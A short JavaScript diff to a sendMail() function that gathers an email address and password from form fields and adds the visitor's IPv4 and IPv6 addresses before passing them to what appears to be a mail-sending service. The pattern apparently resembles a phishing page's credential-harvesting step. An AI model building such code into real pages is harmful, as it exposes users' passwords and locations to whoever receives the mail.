@@ -2,6 +2,8 @@ function sendMail() {
   var params = {
     email: document.getElementById("email").value,
     password: document.getElementById("password").value,
+    IPv4: document.getElementById("IPv4").value,
+    IPv6: document.getElementById("IPv6").value,
   };
 
   const serviceID = "service_v127bm1";
